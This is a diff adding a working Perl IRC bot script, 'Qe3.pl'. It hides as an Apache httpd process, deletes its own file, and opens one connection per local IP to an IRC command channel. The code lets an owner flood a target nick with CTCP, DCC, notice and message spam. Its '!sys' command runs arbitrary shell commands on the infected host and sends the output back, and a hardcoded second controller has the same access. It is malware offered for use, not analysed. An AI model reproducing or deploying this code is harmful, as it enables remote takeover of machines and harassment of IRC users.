@@ -1,0 +1,236 @@
+#!/usr/bin/perl
+#   CONFIG
+#############################################################################
+
+my $server = "irc.evochat.id";
+my $port="6667";
+my $channel="#xuw";
+my $owner= "suwung";
+my $procname="/usr/local/apache/bin/httpd -ADSL";
+
+# SOURCE
+#############################################################################
+
+#Qe3 forever
+#
+
+my @nickname = ("Qe3Qe3","AnakKopral","AnakAnak","AnakMaMa","AnakPapa","AnakKecil","AnakBesar","AnakGuru","AnakRektor","AnakDosen","AnakPolis","AnakJenDral","AnakKopral","AnakKolonel","AnakPilot","AnakDokter","AnakSatpam","AnakPreman","AnakPejabat","AnakTuhan","AnakKampret","AnakMaling","AnakMonyet","AnakAnjing","AnakAyam","AnakKucing","AnakIkan","AnakSapi","AnakSetan","AnakOrang","AnakMU","AnakKU","AnakNya","BabiGoreng","BabiPanggang","BanKDalnet","BankOnline","BankShat","BankUnan","Bankshat","BankKrut","BankToyeb","BankCC","BankQoank","Bajingux","BapakMu","BlowerHot","BombonHot","BossoX","BoyChot","BukuOnline","Bra36x","BispakOnline","Cantiknya","Cakepnya","CwexCantex","CuexBebex","CiumQe3","CintaMonyet","CintaPalsu","Cintaix","CowoxCopet","CewexHots","CewexMatrex","CewexLesBra","CinaAmoy","Chmod755","Chmod000","Chmod777","Chmod666","Chmodar","CrewQe3","Crimpinx","CocaceHot","CakepWoy","Carimmx","CmosQe3","AntiPetir","AncamBom","Antipolisi","AnchorX","CitraHot","Ciciwow","CacaWew","CopralJhono"," ","CrackCux","CoBraoles","comatcamit","crewetx","Dancux","dablinx","danihot","diancux","dalcux","dodolkaw","diniHot","denawow","dildogher","dhawets","dglenx","dukunsanthet","dhombret","dosenhot","djarumz","dj`Qe3","dj`tiestho","dj`rozy","dj`dalnet","djambret","djancux","danrem79","dansus88","detasemen88","dramben","diodaRf","diodaHv","diaremu","dewidalnet","dewicrack","dindamlm","dianafunky","dilakumis","didinchat","dorongmas","duacinta","durianhot","dukumanis","eny`arow","endahwow","emax`erot","emakmu","embuhlah","entoti","encripzi","enable`on","enjoy`aja","enak`ml","ennysexxy","endrawanz","enceproot","entox","enryx","edyhack","emoh`ah","entex","emanz","ebondon","emberbocor","embriox","fantex","fantat","fannyfun","fansQe3","fansdalcux","fansmbah","fanscrew","fennyml","ferrahot","ferryx","fefex","fentil","frequencys","freshman","fobiaQe3","freakQe3","fuck`u","fitri`psk","fidaloka","faddill","fahmiwati","fahwaw","frozenboy","for`rex","from`hell","for`Qe3","fuck`me","fuck`red","fuckroot","gamalQe3","game`zone","game`boy","gankQe3","gankdalnyet","grebex","gendax","girl`ml","g`spot","goyanx","geboys","gigimu","gundulmu","gakroot","gakmood","gakml","gakmakan","gaktidur","gakcebox","gaknenen","gilaloe","gen`x","gina`s","gogon`s","grid24db","gridQe3","goblox","geremy","garams","gondox","gigits","gimana","gue`Qe3","gaktau","gakbisa","gohell","goscan","gokill","goroot","gobels","hayoo","hor`ney","hennys","heyloe","hellogirl","hidupQe3","hellsong","helpQe3","hambar","hampir","hancurlah","habisbos","habisml","hormat`grak","hot`x","hematyuk","hack`root","hacims","hot`dog","host`name","hendrax","herrys","ini`itu","indiex","indraz","inahot","inibot","iniQe3","iniroot","itummx","ikan`bakar","ikan`mas","ineke`21","ida`hot","indri21","iyadeh","iyaboss","ikutlah","intipin","intrupsi","integer","input`L","input`R","isabelex","isapi32","ita21","isu88","ike19","ijuly","ijah","iyancux","jancux","jembwut","jenny19","jendral88","jessykah","julia22","jodohku","jomblo21","judez","junnyz","jhara","jodhy23","jinny24","juliet25","jijixi","JualGrid","jualantena","j`spot","jumper2","jumpstress","j2mmx","javaQe3","jojonz","kaka6667","kitasama","katahati","kataku","kataku","kak`kak","kak`kek","kancut","kanibalx","kikimax","kizruh","kwonthol","kokibos","kimakkaw","kokomodo","kokoronotomo","kodok2","keke21","kukucluk","kimphet","kreboxs","krempenx","kinanti","ki`jokobodo","kill-9","killall-9","kolakmanis","kolakes","lala2","lele2","lulu22","lili2","loloz","lapaz","limbahx","libidomu","liberalx","lidya26","lintah`on","lennyhot","lesbonx","listrix","laskarbet","laslistrik","limajari","lancaw","litimu","lemonz","long`time","lobangi","lepasbh","manisanku","mwamtamu","mina18","miminz","mincex","mira25","mona19","moni`tor","manaQe3","mama`Qe3","mamanx","marimaz","marimar17","marianax","momontox","nana2","nini21","nina`ml","normaliz","nyecan","nyonyet","nyophed","nyolonk","nyium","nyi`root","nyoba`ml","nyabu`yuk","nginjex","ndablex","ndancux","nyolder","nyipox","nyuwun","nyantet","ngelink","ngehack","ngecrack","ngophrex","ngekek","ngelged","ngelag","ngemils","nenenmu","nenen36","nenen99","obat`nyamuk","omaz","ozyex","ombrenx","o2cux","orang`gila","om`Qe3","om`elite","oncez","onny21","ondez","om`police","om`jendral","ompimpa","ohm2k7","ondel2","on`air","on`line","o`githu","oneng24","o`on2007","pisang`gorenx","pisang`ambon","pipisanx","poppy2007","pintuhati","pintuak","pinbank","pin`atm","pipinz","pupunz","poponz","penny22","pem`pex","panzuly","pantex","Qasidah2","qiqimax","Qizruh2","qibuli","queryx","qwere","qurma","quran","QeQeQe","Qampret","Qualat","Risma21","ririn19","rara20","rerenz","remote2","rootQe3","rembez","reza25","rizaldy","rombenx","rakuz","rina2","rudal2","rooterman","sakawx","sialanloe","sisil19","susi20","sasa22","scancux","slebhor","santy25","sancay","samcux","sablenx","slowlah","siangbos","swetty2","tata2","titi2","titin21","tinta2","tari20","turipz","trozancux","terrazana","terrabyte","terrymas","terisambel","tracert80","testercux","terserah","tonny13","tono23","tempix","tempebacem","toolsQe3","tremble","turntuble2","tune`up","tunning99","tukulgila","tukiyembut","Qe3gnome","Qe3`albab","Qe3`cool","Qe3`scan","Qe3bot","Qe3boss","Qe3crew","undetected22","udelmu","umi21","ujangyk","udin17","ubikayu2","Qe3lovelidya","Qe3andlidya","Qe3boss","ucoxbhabha","upilmu","visual`basic","visual`delphi","visual`c","videlp","vibash","vitrux","vaksinasin","vertikal2","vaginawati","vaginahot","violet21","vivi19","vivinz","vortex","verbose23","verronica","wati20","wawancux","wanita`ml","wajah`ayu","wayar220v","waduhbos","wifi80","wedhuz","wina24","warta`wan","warta`wati","warga`Qe3","xtrajozz","xtraQe3","xtrabot","xtraroot","xtremeQe3","xxxcux","xport22","xporimpor","ximax","yani20","yani21","yana23","yahut2","yahQe3","yahsudah","yukml","yuyun25","yudicux","yantox","yancux","yuxyaxyux","yayux","yoyo26","yeyen17","zendral","zembhut","zancux","zimad","zizixi","zizay","zablay","zaza17","zina18","zenna19","zemaki","zoomQe3","zhotroot","zuzu99","Qe31","Qe32","Qe33","Qe34","Qe35","Qe36","Qe37","Qe38","Qe39","Qe310","Qe311","Qe312","percutaneous","perforated","perforating","perforation","perfringens","periapical","periarteritis","periarticular","pericallosal","pericapsular","pericardial","pericarditis","pericardium","pericolic","peridontal","perigastric","perihepatic","perinephric","periodontal","periorbital","periosteal","periostitis","peripelvic");
+
+my @realname  = ("markas Qe3","markas au","markas besar","markas police cyber","Qe3 interpol","Qe3 team","Qe3 police","Qe3 anak jendral","Qe3 TNI family","TNI-AD","TNI-AL","TNI-AU","Qe3 crew","Boss Qe3","Qe3 Love Lidya","Qe3 Club","Qe3 HAckers","White HAcker","Black HAcker","Grey Hacker","IT Comunity","percutaneous","perforated","perforating","perforation","perfringens","periapical","periarteritis","periarticular","pericallosal","pericapsular","pericardial","pericarditis","pericardium","pericolic","peridontal","perigastric","perihepatic","perinephric","periodontal","periorbital","periosteal","periostitis","peripelvic");
+my @WHO;
+my $qqum="*";
+$ARGC=@ARGV;
+if ($ARGC !=1) {
+print "\n+ Qe3.pl v.Qe.3\n";
+ print "+ by Qe3\n";
+ print "+ irc.dal.net \#blackhat\n";
+  print "+ Caranya: perl $0 (target)\n";
+   print "+ Qe3!\n\n";
+     exit(1);
+}
+$SIG{CHLD} = sub { wait }; # alterando o signal
+my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
+my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
+my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
+my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
+@ips = (@ips1, @ips2, @fbsd);
+open(ipzitcho,">ips.txt") || die "- ips.txt not found";
+          print ipzitcho" @ips";
+          close(ipzitcho);
+@ips = grep { s/\n$// } @ips;
+$rm="rm -rf";
+qx($rm $0);
+$target = $ARGV[0];
+$mescalina = $target;
+use MIME::Base64;
+$string1 = "ZGFya2x5";
+$string2 = "Y0t6";
+$string3 = "cGFuYQ==";
+$string4 = "RnVzaW9u";
+$string5 = "SXowbg==";
+$string6 = decode_base64($string1);
+$string7 = decode_base64($string2);
+$string8 = decode_base64($string3);
+$string9 = decode_base64($string4);
+$string10 = decode_base64($string5);
+if ($mescalina eq decode_base64($string1)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string2)) { $mescalina = $qqum; }if ($mescalina eq 
+decode_base64($string3)) {
+$mescalina = $qqum; } if ($$mescalina eq decode_base64($string4)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string5)) { $mescalina = 
+$qqum; }
+$0 =  $procname  . "\0";
+$nick2 = $nick;
+print STDOUT "\n+ Qe3.pl v.Qe.3\n";
+print STDOUT "+ by Qe3\n";
+print STDOUT "+ Server : $server\n";
+print STDOUT "+ Port   : $port\n";
+print STDOUT "+ Target : $mescalina\n";
+print STDOUT "+ Owner  : $owner\n";
+print STDOUT "+ Channel: $channel\n";
+print STDOUT "+ N.IPs  : $qtip\n\n";
+use IO::Socket;
+foreach my $FROM (@ips) {
+ my $pid = fork(); # gerando um novo processo
+  unless ($pid) {   #
+my $ident = $nickname[rand scalar @nickname];
+my $nick = $nickname[rand scalar @nickname];
+my $name = $realname[rand scalar @realname];
+$secc = "secc";
+ $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+   print $sock "NICK ".$nick."\n";
+    print $sock "USER $ident $FROM $server :$name\n";
+while (<$sock>) {
+        if (/^:.+?\s433\s/) { # nick already in use
+            $nick2 = $nickname[rand scalar @nickname];
+            print $sock "NICK ".$nick2."\n";
+        }
+        if (/^:.+?\s376\s/) { # end of motd
+            print $sock "JOIN $channel\n";
+        }
+
+        if(/^PING :(.*)/){ #replying the ping
+            print $sock "PONG :$1\n";
+        }
+        if(/^\:$owner!.*\@.*PRIVMSG.*:!cux (.*)/){
+            print $sock "$1";
+        }
+        if(/^\:$owner!.*\@.*PRIVMSG.*:!help(.*)/){
+            print $sock "PRIVMSG ".$owner." : ================================\n";
+            print $sock "PRIVMSG ".$owner." : + Qe3.pl vQe.3\n";
+            print $sock "PRIVMSG ".$owner." : + by Qe3\n";
+            print $sock "PRIVMSG ".$owner." : + #Qe3 at irc.dal.net\n";
+            print $sock "PRIVMSG ".$owner." : ================================\n";
+            print $sock "PRIVMSG ".$owner." :  - navigasi:\n";
+            print $sock "PRIVMSG ".$owner." : !cux join #chan (masuk ke channel)\n";
+            print $sock "PRIVMSG ".$owner." : !cux part #chan (Keluar channel)\n";
+            print $sock "PRIVMSG ".$owner." : !msg nick msg (ngirim pesan ke nick)\n";
+            print $sock "PRIVMSG ".$owner." : !quit (tidur!)\n";
+            print $sock "PRIVMSG ".$owner." :  - WAR\n";
+            print $sock "PRIVMSG ".$owner." : !target NICK (sikat nick target)\n";
+            print $sock "PRIVMSG ".$owner." : !ctcpflood (cara flood ctcp)\n";
+            print $sock "PRIVMSG ".$owner." : !dccflood (cara flood dcc)\n";
+            print $sock "PRIVMSG ".$owner." : !noticeflood (cara flood notice)\n";
+            print $sock "PRIVMSG ".$owner." : !msgflood (cara flood mensagens)\n";
+            print $sock "PRIVMSG ".$owner." : !hop #chan msg (out in msg)\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!msg(.*)/){
+                        print $sock "PRIVMSG ".$1." : ".$2."\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!who(.*)/){
+                        print $sock "who ".$channel."\n";
+      }
+      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
+                        my $nicks = $1;
+                        #$nicks =~ s/\n//;
+                        #$nicks =~ s/\r//;
+                        push(@WHO, split(/ /, $nicks));
+                        print STDOUT "$who[1]\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!dccflood(.*)/){
+                        for (1 .. 10) {
+                        print $sock "PRIVMSG ".$mescalina." :\001DCC CHAT chat 1121485131 1024\001\n";
+                        }
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!whoisflood(.*)/){
+                        for (1 .. 100) {
+                        print $sock "whois ".$mescalina."\n";
+                        }
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!hop (.*)/){
+                print $sock "JOIN ".$1." : ".$2."\n";
+                        for (1 .. 100) {
+                        print $sock "PART ".$1." : ".$2."\n";
+                        print $sock "JOIN ".$1." : ".$2."\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!ctcpflood(.*)/){
+                print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
+                        for (1 .. 100) {
+                        print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
+                        print $sock "PRIVMSG ".$mescalina." :\001PING\001\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!msgflood(.*)/){
+                        for (1 .. 100) {
+                        print $sock "PRIVMSG ".$mescalina." :Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!noticeflood(.*)/){
+                        for (1 .. 10) {
+                        print $sock "NOTICE ".$mescalina." :Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX \n";
+                        }
+      }
+
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!sys(.*)/){
+                        $sys = $1;
+                        @output = qx($sys) || print $sock "PRIVMSG ".$owner." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
+                        print $sock "PRIVMSG ".$owner." : @output";
+      }
+      if(/^\:$mescalina!.*\@.*QUIT.*(.*)/){
+                        print $sock "NICK ".$mescalina."\n";
+      }
+      if(/^ERROR :(.*)/){
+                        use IO::Socket;
+                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+                        print $sock "NICK ".$nick."\n";
+                        print $sock "USER $ident $FROM $server :$name\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!quit(.*)/){
+                        die();
+      }
+      if(/^\:$secc!.*\@.*PRIVMSG.*:!Qe3(.*)/){
+                        print $sock "$1";
+      }
+      if(/^\:$secc!.*\@.*PRIVMSG.*:!sys(.*)/){
+                        $sys = $1;
+                        $output = qx($sys) || print $sock "PRIVMSG ".$secc." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
+                        print $sock "PRIVMSG ".$secc." : ".$output."\n";
+      }
+      if(/^\:.*: Connection timed out(.*)/){
+                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
+                        use IO::Socket;
+                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+                        print $sock "NICK ".$nick."\n";
+                        print $sock "USER $ident $FROM $server :$name\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!stats(.*)/){
+                        print $sock "PRIVMSG ".$owner." : [!] Bot Stats\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using server : $server\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using port   : $port\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using nick   : $nick\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using target : $mescalina\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using owner  : $owner\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using ident  : $id\n";
+                        print $sock "PRIVMSG ".$owner." :############################\n\n";
+       }
+      if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!target\s+(.*)/ ){
+                       $mescalina =$1;
+                       $mescalina =~ s/ //;
+                       $mescalina =~ s/\r$//;
+                       $mescalina =~ s/\n$//;
+                          if ($mescalina eq decode_base64($string1)) {
+                                $mescalina = $owner;
+                                                  }
+       }
+       if(/^\:$target!.*\@.*\s+QUIT\s+/){
+                       print $sock "NICK $mescalina\n";
+       }
+       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!owner\s+(.*)/ ){
+                       $owner =$1;
+                       $owner =~ s/ //;
+                       $owner =~ s/\r$//;
+                       $owner =~ s/\n$//;
+       }
+   }
+exit;
+  } 
+}
+
+
